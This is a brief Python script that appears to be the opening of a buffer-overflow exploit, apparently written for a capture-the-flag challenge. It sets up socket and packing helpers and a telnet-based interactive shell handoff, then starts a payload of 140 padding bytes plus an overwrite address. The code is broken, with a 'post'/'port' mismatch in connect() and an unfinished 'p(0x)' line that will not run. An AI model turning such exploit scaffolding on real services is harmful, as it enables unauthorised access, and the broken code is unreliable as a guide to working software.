import socket
import time
import os
import sys
import struct
import telnetlib

def connect(ip,post):
    return socket.create_connection((ip,port))

def p(x):
    return struct.pack('<I',x)

def u(x):
    return struct.unpack('<I',x)[0]

def interact(s):
    print('---interactive mode---')
    t=telnetlib.Telnet()
    t.sock=s
    t.interact()

payload='a'*140
payload+=p(0x)